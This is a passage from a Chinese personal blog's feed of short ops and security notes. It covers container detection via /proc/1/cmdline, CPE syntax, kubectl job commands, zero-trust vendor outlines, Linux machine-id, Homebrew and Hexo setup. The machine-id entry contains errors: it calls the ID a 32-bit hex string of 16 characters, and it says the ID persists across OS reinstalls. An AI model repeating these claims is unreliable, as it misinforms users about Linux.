class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br></code></pre></td></tr></table></figure><h3 id="查看-proc-1-cmdline"><a href="#查看-proc-1-cmdline" class="headerlink" title="查看 &#x2F;proc&#x2F;1&#x2F;cmdline"></a>查看 &#x2F;proc&#x2F;1&#x2F;cmdline</h3><p><strong>物理机或虚拟机为 systemd 或者init程序</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span><span class="hljs-operator">/</span>cmdline<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>systemd<span class="hljs-operator">--</span>system<span class="hljs-operator">--</span>deserialize25<br><br>[root<span class="hljs-meta">@localhost</span> <span class="hljs-regexp">/]# cat /</span>proc<span class="hljs-regexp">/1/</span>cmdline<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>systemd<span class="hljs-operator">--</span>switched<span class="hljs-operator">-</span>root<span class="hljs-operator">--</span>system<span class="hljs-operator">--</span>deserialize22<br></code></pre></td></tr></table></figure><p><strong>容器为应用程序</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@4db3bdbde0f4 /]# <span class="hljs-built_in">cat</span> /proc/1/cmdline<br>/bin/bash<br></code></pre></td></tr></table></figure><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】判断服务器是否为虚拟机的几种方法 <a href="https://www.jianshu.com/u/f109418ce585">baiyongjie</a> 2020.04.03 23:02:16</p><p><a href="https://www.jianshu.com/p/cc9033914819">https://www.jianshu.com/p/cc9033914819</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>cloudsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>security</tag>
      
      <tag>cloudsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cpe</title>
    <link href="/2024/12/16/yunwei/yunweibase/cpe/"/>
    <url>/2024/12/16/yunwei/yunweibase/cpe/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Common Platform Enumeration 通用平台枚举</p><p>以标准化方式为软件应用程序、操作系统及硬件命令的方法</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">cpe:</span>/&lt;part&gt;<span class="hljs-symbol">:&lt;vendor&gt;</span><span class="hljs-symbol">:&lt;product&gt;</span><span class="hljs-symbol">:&lt;version&gt;</span><span class="hljs-symbol">:&lt;update&gt;</span><span class="hljs-symbol">:&lt;edition&gt;</span><span class="hljs-symbol">:&lt;language&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>cpe:&#x2F;o:almalinux:almalinux:9::baseos</p><h3 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h3><h4 id="part-目标类型"><a href="#part-目标类型" class="headerlink" title="part 目标类型"></a>part 目标类型</h4><p>可选的值：<br>a 应用程序</p><p>h 硬件平台</p><p>o 操作系统</p><h4 id="vendor-厂商"><a href="#vendor-厂商" class="headerlink" title="vendor 厂商"></a>vendor 厂商</h4><h4 id="product-产品名称"><a href="#product-产品名称" class="headerlink" title="product 产品名称"></a>product 产品名称</h4><h4 id="version-厂商提供的产品版本号"><a href="#version-厂商提供的产品版本号" class="headerlink" title="version 厂商提供的产品版本号"></a>version 厂商提供的产品版本号</h4><h4 id="update-厂商提供的产品更新版本，细粒度更小"><a href="#update-厂商提供的产品更新版本，细粒度更小" class="headerlink" title="update 厂商提供的产品更新版本，细粒度更小"></a>update 厂商提供的产品更新版本，细粒度更小</h4><h4 id="edition-发行版本，属于被弃用的属性，一般是为了兼容更早-CPE-版本，默认值为-ANY"><a href="#edition-发行版本，属于被弃用的属性，一般是为了兼容更早-CPE-版本，默认值为-ANY" class="headerlink" title="edition 发行版本，属于被弃用的属性，一般是为了兼容更早 CPE 版本，默认值为 ANY"></a>edition 发行版本，属于被弃用的属性，一般是为了兼容更早 CPE 版本，默认值为 ANY</h4><h4 id="language-界面语言"><a href="#language-界面语言" class="headerlink" title="language  界面语言"></a>language  界面语言</h4><h4 id="se-edittion-表示产品是针对某些特定市场或类别的目标用户"><a href="#se-edittion-表示产品是针对某些特定市场或类别的目标用户" class="headerlink" title="se_edittion  表示产品是针对某些特定市场或类别的目标用户"></a>se_edittion  表示产品是针对某些特定市场或类别的目标用户</h4><h4 id="target-sw-产品运行需要的软件环境"><a href="#target-sw-产品运行需要的软件环境" class="headerlink" title="target_sw 产品运行需要的软件环境"></a>target_sw 产品运行需要的软件环境</h4><h4 id="target-hw-产品运行需要的硬件环境"><a href="#target-hw-产品运行需要的硬件环境" class="headerlink" title="target_hw  产品运行需要的硬件环境"></a>target_hw  产品运行需要的硬件环境</h4><h4 id="other-表示无法归类上上述其他属性的值"><a href="#other-表示无法归类上上述其他属性的值" class="headerlink" title="other 表示无法归类上上述其他属性的值"></a>other 表示无法归类上上述其他属性的值</h4><p>如果在 WFN 未使用某个属性，则称为未指明的属性，默认值未 ANY。<code>sw_edition</code> <code>target_sw</code> <code>target_hw</code> <code>other</code> 是新引入的属性，被称作扩展属性</p><p><img src="/2024/12/16/yunwei/yunweibase/cpe/image-20241217145011696.png" alt="image-20241217145011696"></p><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p>【1】网络安全知识图谱构建之CPE通用组件数据集 </p><p><a href="https://zhuanlan.zhihu.com/p/282898536">https://zhuanlan.zhihu.com/p/282898536</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweibase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweibase</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s_base</title>
    <link href="/2024/12/16/security/cloudsec/k8s/k8s_base/"/>
    <url>/2024/12/16/security/cloudsec/k8s/k8s_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>google开源</p><p>基础架构</p><p>master节点和node节点</p><p>master节点负责资源分配，应用调度，应用扩容等</p><p>node节点允许应用服务，node节点的kubelet负责进行master和node通信</p><p>k8s主要组件</p><p>kube-apiserver</p><h2 id="查看k8s版本"><a href="#查看k8s版本" class="headerlink" title="查看k8s版本"></a>查看k8s版本</h2><p>kubectl version</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@node02 ~]# kubectl <span class="hljs-keyword">version</span><br><span class="hljs-built_in">WARNING</span>: This <span class="hljs-keyword">version</span> information <span class="hljs-keyword">is</span> deprecated <span class="hljs-keyword">and</span> will be replaced <span class="hljs-keyword">with</span> the output <span class="hljs-keyword">from</span> kubectl <span class="hljs-keyword">version</span> <span class="hljs-comment">--short.  Use --output=yaml|json to get the full version.</span><br>Client <span class="hljs-keyword">Version</span>: <span class="hljs-keyword">version</span>.<span class="hljs-keyword">Info</span>&#123;Major:&quot;1&quot;, Minor:&quot;26&quot;, GitVersion:&quot;v1.26.1&quot;, GitCommit:&quot;8f94681cd294aa8cfd3407b8191f6c70214973a4&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2023-01-18T15:58:16Z&quot;, GoVersion:&quot;go1.19.5&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;<br>Kustomize <span class="hljs-keyword">Version</span>: v4<span class="hljs-number">.5</span><span class="hljs-number">.7</span><br><span class="hljs-keyword">Server</span> <span class="hljs-keyword">Version</span>: <span class="hljs-keyword">version</span>.<span class="hljs-keyword">Info</span>&#123;Major:&quot;1&quot;, Minor:&quot;24&quot;, GitVersion:&quot;v1.24.6&quot;, GitCommit:&quot;b39bf148cd654599a52e867485c02c4f9d28b312&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2022-09-21T13:12:04Z&quot;, GoVersion:&quot;go1.18.6&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;<br><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">version</span> difference <span class="hljs-keyword">between</span> client (<span class="hljs-number">1.26</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">server</span> (<span class="hljs-number">1.24</span>) exceeds the supported minor <span class="hljs-keyword">version</span> skew <span class="hljs-keyword">of</span> +/<span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="查看-job"><a href="#查看-job" class="headerlink" title="查看 job"></a>查看 job</h2><p>kubectl get job</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># kubectl get job</span><br>NAME          COMPLETIONS   DURATION   AGE<br>kube-hunter   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>           <span class="hljs-number">49</span>s        <span class="hljs-number">57</span>m<br></code></pre></td></tr></table></figure><h2 id="删除job"><a href="#删除job" class="headerlink" title="删除job"></a>删除job</h2><h3 id="按照job名删除"><a href="#按照job名删除" class="headerlink" title="按照job名删除"></a>按照job名删除</h3><p>kubectl delete job jobname</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@master01 kube-hunter]<span class="hljs-comment"># kubectl get job</span><br>NAME          COMPLETIONS   DURATION   AGE<br>kube-hunter   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>           <span class="hljs-number">49</span>s        <span class="hljs-number">57</span>m<br>[root@master01 kube-hunter]<span class="hljs-comment"># </span><br>[root@master01 kube-hunter]<span class="hljs-comment"># </span><br>[root@master01 kube-hunter]<span class="hljs-comment"># kubectl delete job kube-hunter</span><br>job.batch <span class="hljs-string">&quot;kube-hunter&quot;</span> deleted<br>[root@master01 kube-hunter]<span class="hljs-comment"># kubectl get job</span><br>No resources found <span class="hljs-keyword">in</span> <span class="hljs-keyword">default</span> namespace.<br></code></pre></td></tr></table></figure><h2 id="创建job"><a href="#创建job" class="headerlink" title="创建job"></a>创建job</h2><p><strong>kubectl create -f jobfile</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># kubectl create -f ./job.yaml</span><br><br>job.batch/kube-hunter created<br><br>[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># </span><br><br>[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># </span><br><br>[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># kubectl get jobs</span><br><br>NAME     COMPLETIONS  DURATION  AGE<br><br>kube-hunter  <span class="hljs-number">0</span>/<span class="hljs-number">1</span>      <span class="hljs-number">11</span>s    <span class="hljs-number">11</span>s<br></code></pre></td></tr></table></figure><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>cloudsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>base</tag>
      
      <tag>cloudsec</tag>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc_attack</title>
    <link href="/2024/12/16/security/itsec/dc/dc_attack/"/>
    <url>/2024/12/16/security/itsec/dc/dc_attack/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
      <tag>attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>零信任架构</title>
    <link href="/2024/12/16/security/itsec/%E9%9B%B6%E4%BF%A1%E4%BB%BB/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%9E%B6%E6%9E%84/"/>
    <url>/2024/12/16/security/itsec/%E9%9B%B6%E4%BF%A1%E4%BB%BB/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h3><p>1、</p><p>2、</p><p>3、</p><h3 id="应对的方案"><a href="#应对的方案" class="headerlink" title="应对的方案"></a>应对的方案</h3><h4 id="持续验证"><a href="#持续验证" class="headerlink" title="持续验证"></a>持续验证</h4><h4 id="动态授权"><a href="#动态授权" class="headerlink" title="动态授权"></a>动态授权</h4><h4 id="全局防御"><a href="#全局防御" class="headerlink" title="全局防御"></a>全局防御</h4><h3 id="MAC-电脑-MDM"><a href="#MAC-电脑-MDM" class="headerlink" title="MAC 电脑 - MDM"></a>MAC 电脑 - MDM</h3><p>移动设备管理（MDM）</p><p>通过将描述文件和命令发送到设备来让你安全地以无线方式配置设备</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>应用访问权限按照终端进程和部门设置</p><p>应用访问权限按照终端和时间设置</p><p>应用访问权限可以临时申请审批</p><p>数据权限按照终端设置，例如禁止下载文件、</p><p>数据水印按照应用</p><p>？应用如何接入零信任</p><p>权限存在有效期</p><h2 id="厂商方案"><a href="#厂商方案" class="headerlink" title="厂商方案"></a>厂商方案</h2><h3 id="百度7层零信任"><a href="#百度7层零信任" class="headerlink" title="百度7层零信任"></a>百度7层零信任</h3><p>问题</p><p>   （1）提供SaaS化的零信任网关服务</p><p>   （2）提供身份服务和账号风控能力</p><p>   （3）提供私有化部署完整解决方案(准入、零信任网关、桌管等能力)</p><p>安全能力</p><p>   （1）加密访问: 提供透明的加密访问能力</p><p>   （2）认证鉴权: 提供透明的SSO认证能力，以及域名级别访问控制能力</p><p>   （3）操作审计: 谁在什么时间点请求了哪个内网服务</p><p>   （4）安全防护: 提供WAF能力、用户异常访问动作序列等风控能力</p><p>   （5）数据防泄露: 检测响应里是否有敏感数据，对文件进行标记</p><p><a href="https://mp.weixin.qq.com/s/5utSjmXrh5enrAvJmJLFvQ">https://mp.weixin.qq.com/s/5utSjmXrh5enrAvJmJLFvQ</a></p><h3 id="腾讯零信任"><a href="#腾讯零信任" class="headerlink" title="腾讯零信任"></a>腾讯零信任</h3><p>腾讯ioa管理平台</p><p><img src="/%E8%85%BE%E8%AE%AFioa%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0.png" alt="腾讯ioa管理平台"></p><p>腾讯ioa架构</p><p><img src="/%E8%85%BE%E8%AE%AFioa%E6%9E%B6%E6%9E%84.jpg" alt="腾讯ioa架构"></p><h3 id="华为云零信任"><a href="#华为云零信任" class="headerlink" title="华为云零信任"></a>华为云零信任</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
      <tag>零信任</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>machine_id</title>
    <link href="/2024/12/16/yunwei/yunweibase/Linuxbase/machine_id/"/>
    <url>/2024/12/16/yunwei/yunweibase/Linuxbase/machine_id/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在 Linux 系统中，每台计算机都有一个唯一的标识符，称为机器 ID（Machine ID）。机器 ID 是一个由操作系统生成的字符串，用于标识特定的计算机。它在系统启动时自动生成，并且在系统的整个生命周期中保持不变。本文将详细介绍机器 ID 的作用、生成方式以及在 Linux 系统中的应用。</p><h2 id="机器-ID-的生成方式"><a href="#机器-ID-的生成方式" class="headerlink" title="机器 ID 的生成方式"></a>机器 ID 的生成方式</h2><p>Linux 系统中的机器 ID 是通过以下方式生成的：</p><h3 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h3><p>在现代的 Linux 发行版中，机器 ID 是由 systemd 生成和管理的。systemd 是一个系统和服务管理器，它负责启动、停止和管理系统上的各种进程和服务。当系统启动时，systemd 会生成一个机器 ID 并将其存储在 <code>/etc/machine-id</code> 文件中。这个文件是一个只包含机器 ID 的纯文本文件。</p><p>&#x2F;etc&#x2F;machine-id 文件默认权限</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/var/log</span><span class="hljs-comment"># ls -lat /etc/machine-id</span><br>-r--r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">33</span> <span class="hljs-title class_">Jun</span> <span class="hljs-number">13</span>  <span class="hljs-number">2023</span> /etc/machine-id<br></code></pre></td></tr></table></figure><h3 id="生成规则"><a href="#生成规则" class="headerlink" title="生成规则"></a>生成规则</h3><p>机器 ID 是一个 32 位的十六进制字符串，由 16 个字符组成。生成机器 ID 的规则如下：</p><ul><li>首先，系统会尝试读取 <code>/etc/machine-id</code> 文件。如果该文件存在且内容有效，则将其用作机器 ID。</li><li>如果 <code>/etc/machine-id</code> 文件不存在或内容无效，则系统会生成一个新的机器 ID，并将其写入 <code>/etc/machine-id</code> 文件中。</li></ul><h2 id="机器-ID-的作用"><a href="#机器-ID-的作用" class="headerlink" title="机器 ID 的作用"></a>机器 ID 的作用</h2><p>机器 ID 在 Linux 系统中具有以下作用：</p><h3 id="唯一标识符"><a href="#唯一标识符" class="headerlink" title="唯一标识符"></a>唯一标识符</h3><p>机器 ID 是用来唯一标识一台计算机的。通过机器 ID，系统可以识别不同的计算机，并进行一些特定的操作和配置。</p><h3 id="许可验证"><a href="#许可验证" class="headerlink" title="许可验证"></a>许可验证</h3><p>一些软件和服务提供商可能使用机器 ID 来验证许可证和授权。通过检查机器 ID，他们可以确定软件是否在授权范围内运行。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>机器 ID 在安全性方面也起到了一定的作用。它可以用于生成一些加密密钥或用于加密通信，以确保只有具有特定机器 ID 的计算机才能解密和访问数据。</p><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><p>机器 ID 还可以用于系统配置和管理。一些配置文件和脚本可能会根据机器 ID 进行不同的操作或应用不同的设置。</p><h2 id="使用机器-ID"><a href="#使用机器-ID" class="headerlink" title="使用机器 ID"></a>使用机器 ID</h2><p>在 Linux 系统中，可以使用机器 ID 来进行一些操作和配置。</p><h3 id="查看机器-ID"><a href="#查看机器-ID" class="headerlink" title="查看机器 ID"></a>查看机器 ID</h3><p>要查看当前计算机的机器 ID，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/machine-id<br></code></pre></td></tr></table></figure><h3 id="使用机器-ID-进行其他操作"><a href="#使用机器-ID-进行其他操作" class="headerlink" title="使用机器 ID 进行其他操作"></a>使用机器 ID 进行其他操作</h3><p>除了查看机器 ID，还可以在以下情况下使用机器 ID 进行操作和配置：</p><ul><li>许可验证：某些软件和服务可能需要验证机器 ID 才能使用许可证进行授权。在这种情况下，你可以将机器 ID 提供给软件或服务提供商以进行许可证验证。</li><li>系统配置：一些配置文件或脚本可能会使用机器 ID 进行不同的操作或应用不同的设置。你可以根据机器 ID 编写脚本或配置文件，以根据不同的机器 ID 进行特定的配置。</li><li>安全性：机器 ID 可用于增加系统的安全性。例如，你可以使用机器 ID 生成一些加密密钥，以确保只有具有特定机器 ID 的计算机才能解密和访问数据。</li></ul><h2 id="机器-ID-的注意事项"><a href="#机器-ID-的注意事项" class="headerlink" title="机器 ID 的注意事项"></a>机器 ID 的注意事项</h2><p>在使用机器 ID 时，需要注意以下事项：</p><ul><li>唯一性：机器 ID 应该是唯一的，每台计算机都应该有不同的机器 ID。确保在克隆或复制系统时更新机器 ID。</li><li>保密性：机器 ID 是一个敏感信息，应该妥善保管。避免将机器 ID 泄露给不信任的人或系统。</li><li>持久性：机器 ID 在系统的整个生命周期中保持不变。在更换硬件或重新安装操作系统时，机器 ID 通常不会改变。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>机器 ID 是 Linux 系统中用于唯一标识计算机的标识符。它由 systemd 生成并存储在 <code>/etc/machine-id</code> 文件中。机器 ID 在许可验证、安全性和系统配置方面发挥着重要作用。通过机器 ID，系统可以识别不同的计算机并进行特定的操作和配置。在使用机器 ID 时，请确保唯一性、保密性和持久性，并根据需要使用相应的命令和配置文件来操作和配置系统。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】开发者社区&#x2F;龙蜥操作系统&#x2F;文章&#x2F;什么是 Linux 中的机器 ID？</p><p><a href="https://developer.aliyun.com/article/1319056">https://developer.aliyun.com/article/1319056</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweibase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweibase</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>brew_base</title>
    <link href="/2024/12/16/yunwei/applications/Macapplications/brew/brew_base/"/>
    <url>/2024/12/16/yunwei/applications/Macapplications/brew/brew_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>brew uninstall –ignore-dependencies <a href="mailto:&#112;&#x79;&#116;&#104;&#x6f;&#x6e;&#64;&#x33;&#x2e;&#49;&#x33;">&#112;&#x79;&#116;&#104;&#x6f;&#x6e;&#64;&#x33;&#x2e;&#49;&#x33;</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  brew uninstall --ignore-<span class="hljs-keyword">dependencies</span> python@<span class="hljs-number">3.13</span><br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>python@<span class="hljs-number">3.13</span>/<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>_1... (<span class="hljs-number">3</span>,<span class="hljs-number">277</span> files, <span class="hljs-number">65.2</span>MB)<br>==&gt; Autoremoving <span class="hljs-number">10</span> unneeded formulae:<br>icu4c@<span class="hljs-number">75</span><br>jpeg<br>libffi<br>lua@<span class="hljs-number">5.3</span><br>pcre<br>protobuf<br>python-lxml<br>python-setuptools<br>pyyaml<br>six<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>python-setuptools/<span class="hljs-number">69.0</span>.<span class="hljs-number">3</span>... (<span class="hljs-number">262</span> files, <span class="hljs-number">2.9</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/i</span>cu4c@<span class="hljs-number">75</span>/<span class="hljs-number">75.1</span>... (<span class="hljs-number">277</span> files, <span class="hljs-number">78.8</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>python-lxml/<span class="hljs-number">5.1</span>.<span class="hljs-number">0</span>... (<span class="hljs-number">204</span> files, <span class="hljs-number">9.8</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>pyyaml/<span class="hljs-number">6.0</span>.<span class="hljs-number">1</span>_1... (<span class="hljs-number">86</span> files, <span class="hljs-number">1.4</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>pcre/<span class="hljs-number">8.45</span>... (<span class="hljs-number">204</span> files, <span class="hljs-number">4.6</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>lua@<span class="hljs-number">5.3</span>/<span class="hljs-number">5.3</span>.<span class="hljs-number">6</span>... (<span class="hljs-number">28</span> files, <span class="hljs-number">407.3</span>KB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>six/<span class="hljs-number">1.16</span>.<span class="hljs-number">0</span>_4... (<span class="hljs-number">20</span> files, <span class="hljs-number">122.4</span>KB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>jpeg/<span class="hljs-number">9</span>e... (<span class="hljs-number">21</span> files, <span class="hljs-number">904.2</span>KB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>protobuf/<span class="hljs-number">21.12</span>... (<span class="hljs-number">288</span> files, <span class="hljs-number">19.6</span>MB)<br>protobuf <span class="hljs-number">21.4</span> and <span class="hljs-number">3.19</span>.<span class="hljs-number">4</span> are still installed.<br>To remove all versions, run:<br>  brew uninstall --force protobuf<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>libffi/<span class="hljs-number">3.4</span>.<span class="hljs-number">2</span>... (<span class="hljs-number">17</span> files, <span class="hljs-number">673.3</span>KB)<br></code></pre></td></tr></table></figure><h2 id="查看安装的包"><a href="#查看安装的包" class="headerlink" title="查看安装的包"></a>查看安装的包</h2><p>brew list –formula | grep 包关键字</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel">➜   brew list --formula | grep <span class="hljs-keyword">python</span><br><span class="hljs-keyword">python</span>-certifi<br><span class="hljs-keyword">python</span>-cryptography<br><span class="hljs-keyword">python</span>-packaging<br><span class="hljs-keyword">python</span>@3<span class="hljs-number">.10</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applicatons</category>
      
      <category>macapplications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applicatons</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_install</title>
    <link href="/2024/12/15/yunwei/hexo/hexo_install/"/>
    <url>/2024/12/15/yunwei/hexo/hexo_install/</url>
    
    <content type="html"><![CDATA[<h2 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h2><h3 id="安装npm"><a href="#安装npm" class="headerlink" title="安装npm"></a>安装npm</h3><p>brew install npm</p><p>npm -v 查看已安装版本</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">➜  tthours <span class="hljs-built_in">npm</span> -v<br><span class="hljs-number">10.9</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure><h3 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h3><p>brew install node</p><p>node -v 查看已安装版本</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">➜  tthours <span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br>v23.<span class="hljs-number">4.0</span><br></code></pre></td></tr></table></figure><h3 id="安装hexo-cli"><a href="#安装hexo-cli" class="headerlink" title="安装hexo-cli"></a>安装hexo-cli</h3><p>npm install -g hexo-cli </p><h2 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>hexo init 博客文件夹</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 